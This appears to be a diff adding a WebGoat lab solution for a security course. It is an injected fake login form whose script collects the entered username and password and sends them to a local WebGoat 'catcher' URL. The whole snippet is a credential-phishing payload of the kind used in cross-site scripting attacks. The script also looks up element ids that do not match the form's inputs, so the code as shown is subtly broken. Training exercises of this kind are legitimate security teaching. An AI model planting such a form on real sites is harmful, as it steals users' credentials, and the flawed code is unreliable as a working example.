@@ -1,0 +1,13 @@
+<script>
+    function myFunction() {
+        var username = document.getElementById("user").value; 
+        var password = document.getElementById("pass").value; 
+        var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishUsername=" + username + "&phishPassword=" + password;
+        fetch(url, {method: "POST"});
+    }
+</script>
+<form>
+    username: <input type="text" id="ece568-2020-user">
+    password: <input type="password" id="ece568-2020-pass">
+    <button onclick="myFunction()" id="ece568-2020-submit">submit</button>
+</form>
